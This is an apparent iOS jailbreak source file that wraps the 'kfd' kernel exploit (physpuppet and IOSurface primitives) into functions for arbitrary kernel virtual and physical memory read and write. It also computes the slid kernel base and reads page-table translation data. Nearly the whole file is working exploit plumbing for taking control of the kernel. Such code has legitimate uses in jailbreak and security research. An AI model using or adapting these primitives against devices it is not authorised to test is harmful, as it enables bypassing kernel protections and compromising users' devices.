#include "kfd/kfd/libkfd.h"
#include "virtrw.h"
#include "physrw.h"
#include "offsets.h"
#include <os/log.h>

#import <Foundation/Foundation.h>

uint64_t gKfd;
NSLock *gKrwLock;

void kfd_kwrite64(uint64_t kaddr, uint64_t val)
{
    [gKrwLock lock];
    kwrite(gKfd, &val, kaddr, sizeof(val));
    [gKrwLock unlock];
}

uint64_t kfd_kread64(uint64_t kaddr)
{
    uint64_t r = 0;
    [gKrwLock lock];
    kread(gKfd, kaddr, &r, sizeof(r));
    [gKrwLock unlock];
    return r;
}

int kfd_kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint64_t endAddr = kaddr + size;
	uint32_t outputOffset = 0;
	unsigned char* outputBytes = (unsigned char*)output;
    uint64_t batchSize = 8;
	
	for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += batchSize)
	{
		uint64_t k = kfd_kread64(curAddr);

		unsigned char* kb = (unsigned char*)&k;
		for(uint64_t i = 0; i < batchSize; i++)
		{
			if(outputOffset == size) break;
			outputBytes[outputOffset] = kb[i];
			outputOffset++;
		}
		if(outputOffset == size) break;
	}

	return 0;
}

int kfd_kwritebuf(uint64_t kaddr, const void* input, size_t size)
{
    uint64_t endAddr = kaddr + size;
	uint32_t inputOffset = 0;
	unsigned char* inputBytes = (unsigned char*)input;
    uint64_t batchSize = 8;
	
	for(uint64_t curAddr = kaddr; curAddr < endAddr; curAddr += batchSize)
	{
		uint64_t toWrite = 0;
		uint64_t curBatchSize = batchSize;
		
		uint64_t remainingBytes = endAddr - curAddr;
		if(remainingBytes < batchSize)
		{
			toWrite = kfd_kread64(curAddr);
			curBatchSize = remainingBytes;
		}

		unsigned char* wb = (unsigned char*)&toWrite;
		for(uint64_t i = 0; i < curBatchSize; i++)
		{
			wb[i] = inputBytes[inputOffset];
			inputOffset++;
		}

		kfd_kwrite64(curAddr, toWrite);
	}

	return 0;
}

uint64_t kfd_init_wrapper(uint64_t *kernelBaseOut)
{
    gKfd = kopen(2048, puaf_physpuppet, kread_IOSurface, kwrite_IOSurface);
    gKrwLock = [[NSLock alloc] init];
    
    kreadbuf = kfd_kreadbuf;
    kwritebuf = kfd_kwritebuf;

    struct kfd *kfd = (struct kfd *)gKfd;

    *kernelBaseOut = 0xFFFFFFF007004000 + kfd->info.kernel.kernel_slide;

    return gKfd;
}

void kfd_deinit(void)
{
    kclose(gKfd);
}

void kfd_resolve_translation_offsets(uint64_t *virtBaseOut, uint64_t *physBaseOut)
{
    struct kfd *kfd = (struct kfd *)gKfd;

    // Needed in order for phystokv / vtophys to work
    kread((u64)kfd, SLIDE(gOffsets.gPhysBase), &kfd->info.kernel.gPhysBase, sizeof(kfd->info.kernel.gPhysBase));
    kread((u64)kfd, SLIDE(gOffsets.gPhysSize), &kfd->info.kernel.gPhysSize, sizeof(kfd->info.kernel.gPhysSize));
    kread((u64)kfd, SLIDE(gOffsets.gVirtBase), &kfd->info.kernel.gVirtBase, sizeof(kfd->info.kernel.gVirtBase));
    kread((u64)kfd, SLIDE(gOffsets.ptov_table), &kfd->info.kernel.ptov_table, sizeof(kfd->info.kernel.ptov_table));
    
    *virtBaseOut = kfd->info.kernel.gVirtBase;
    *physBaseOut = kfd->info.kernel.gPhysBase;

    assert(kfd->info.kernel.current_pmap);
    u64 ttbr0_va_kaddr = kfd->info.kernel.current_pmap + static_offsetof(pmap, tte);
    u64 ttbr0_pa_kaddr = kfd->info.kernel.current_pmap + static_offsetof(pmap, ttep);
    kread((u64)(kfd), ttbr0_va_kaddr, &kfd->info.kernel.ttbr[0].va, sizeof(kfd->info.kernel.ttbr[0].va));
    kread((u64)(kfd), ttbr0_pa_kaddr, &kfd->info.kernel.ttbr[0].pa, sizeof(kfd->info.kernel.ttbr[0].pa));
    assert(phystokv(kfd, kfd->info.kernel.ttbr[0].pa) == kfd->info.kernel.ttbr[0].va);

    assert(kfd->info.kernel.kernel_pmap);
    u64 ttbr1_va_kaddr = kfd->info.kernel.kernel_pmap + static_offsetof(pmap, tte);
    u64 ttbr1_pa_kaddr = kfd->info.kernel.kernel_pmap + static_offsetof(pmap, ttep);
    kread((u64)(kfd), ttbr1_va_kaddr, &kfd->info.kernel.ttbr[1].va, sizeof(kfd->info.kernel.ttbr[1].va));
    kread((u64)(kfd), ttbr1_pa_kaddr, &kfd->info.kernel.ttbr[1].pa, sizeof(kfd->info.kernel.ttbr[1].pa));
    assert(phystokv(kfd, kfd->info.kernel.ttbr[1].pa) == kfd->info.kernel.ttbr[1].va);
}

uint64_t kfd_phystokv(uint64_t physAddr)
{
    return phystokv((struct kfd *)gKfd, physAddr);
}

uint64_t kfd_vtophys(uint64_t virtAddr)
{
    return vtophys((struct kfd *)gKfd, virtAddr);
}

int kfd_physreadbuf(uint64_t pa, void *output, size_t size)
{
    uint64_t curPa = pa;
    uint8_t *data = output;
    size_t sizeLeft = size;

    while (sizeLeft > 0) {
        uint64_t physPage = curPa & ~PAGE_MASK;
        uint64_t pageOffset = curPa & PAGE_MASK;
        uint64_t readSize = min(sizeLeft, PAGE_SIZE - pageOffset);

        uint64_t virtPage = kfd_phystokv(physPage);
        if (virtPage == 0) {
            printf("Physread failed to translate to virtual: 0x%llx\n", physPage);
            return 1;
        }

        int vr = kreadbuf(virtPage + pageOffset, &data[size - sizeLeft], readSize);
        if (vr != 0) {
            printf("Virtual read at 0x%llx failed: %d\n", virtPage + pageOffset, vr);
            return vr;
        }

        curPa += readSize;
        sizeLeft -= readSize;
    }

    return 0;
}

int kfd_physwritebuf(uint64_t pa, const void* input, size_t size)
{
    uint64_t curPa = pa;
    const uint8_t *data = input;
    size_t sizeLeft = size;

    while (sizeLeft > 0) {
        uint64_t physPage = curPa & ~PAGE_MASK;
        uint64_t pageOffset = curPa & PAGE_MASK;
        uint64_t writeSize = min(sizeLeft, PAGE_SIZE - pageOffset);

        uint64_t virtPage = kfd_phystokv(physPage);
        if (virtPage == 0) {
            printf("Physwrite failed to translate to virtual: 0x%llx\n", physPage);
            return 1;
        } 

        int vr = kwritebuf(virtPage + pageOffset, &data[size - sizeLeft], writeSize);
        if (vr != 0) {
            printf("Virtual write at 0x%llx failed: %d\n", virtPage + pageOffset, vr);
            return vr;
        }

        curPa += writeSize;
        sizeLeft -= writeSize;
    }

    return 0;
}

void kfd_init_fake_physrw(void)
{
    physreadbuf = kfd_physreadbuf;
    physwritebuf = kfd_physwritebuf;
}